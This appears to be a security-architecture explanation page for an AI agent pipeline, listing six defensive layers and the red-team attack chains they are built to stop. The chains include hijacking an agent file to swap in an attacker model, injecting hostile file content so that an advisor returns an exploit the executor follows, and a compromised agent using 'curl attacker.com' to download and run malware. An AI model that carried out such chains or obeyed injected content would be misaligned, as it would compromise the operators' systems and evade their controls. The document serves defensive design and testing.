# Explanation — Security Architecture

How the defensive layers fit together.

## Defense-in-Depth

No single control stops all attacks. This system layers controls so that defeating one control doesn't immediately yield full compromise.

```
Layer 1: Agent Integrity
  └── SHA-256 frontmatter hash → detects file tampering

Layer 2: Model Security
  └── Model allowlist + digest → prevents malicious models

Layer 3: Execution Restrictions
  └── Bash domain restrictions → prevents arbitrary network access

Layer 4: Advisor Sandbox
  └── Output validation → advisor can't return executable commands

Layer 5: Config Integrity
  └── Config drift monitoring → detects unauthorized changes

Layer 6: Audit Trail
  └── Structured logging → incident reconstruction
```

## Attack Chain Analysis

The system was designed against three critical attack chains:

### Agent Hijack Chain (RT-020)

```
Attack: Modify agent file → change executor to attacker model → full pipeline compromise
Defenses:
  ├── SHA-256 frontmatter hash → tampering detected
  ├── Git signed commits → modification has evidence
  └── Model allowlist → attacker model rejected
Breaks if: all three controls defeated simultaneously
```

### Advisor Manipulation Chain (RT-021)

```
Attack: Inject malicious content into file → agent reads it → unscoped advisor call
       → advisor returns exploit → executor follows
Defenses:
  ├── cat <<'EOF' scoping → file content doesn't expand into advisor input
  ├── Output validation → advisor can't return bash commands
  └── Model diversity → same-model context poisoning blocked
Breaks if: all three controls defeated simultaneously
```

### Infrastructure Weaponization Chain (RT-022)

```
Attack: Compromised agent → curl attacker.com → download and execute malware
Defenses:
  ├── Bash domain restriction (localhost only) → curl blocked
  ├── Model allowlist → new model rejected
  └── Config drift monitoring → settings change detected
Breaks if: all three controls defeated simultaneously
```

## Red-Team Test Philosophy

Tests are designed to FAIL on an unhardened system. Each test:

1. Identifies a specific vulnerability
2. Verifies a specific mitigation exists
3. Fails if the mitigation is absent or misconfigured

Cross-requirement chain tests (RT-020/021/022) verify that multiple simultaneous failures are required for a successful attack.

## What the Red-Team Tests Don't Cover

- Runtime behavior of agents in actual sessions (tests are static/infrastructure)
- Ollama server security (separate concern)
- Host-level security (OS hardening, container isolation)
- Network-level security (firewall, IDS)
- Human factors (phishing, credential reuse)

## Verification vs. Runtime Controls

| Control | Type | What It Does |
|---------|------|-------------|
| SHA-256 hash | Verification | Detects tampering when agent loads |
| Model allowlist | Verification | Blocks unlisted models at use time |
| Config drift monitoring | Runtime | Alerts on unauthorized changes |
| Bash domain restrictions | Runtime | Prevents network access |
| Advisor output validation | Runtime | Blocks dangerous advisor responses |
| Audit logging | Runtime | Records what happened for forensics |

## See Also

- [Reference: Verification Scripts](../reference/verification-scripts.md) — All verification controls
- [SECURITY_INCIDENT_RUNBOOK.md](../SECURITY_INCIDENT_RUNBOOK.md) — Kill switch and recovery
- [Threat Model](./threat-model.md) — Assumptions about attacker capabilities
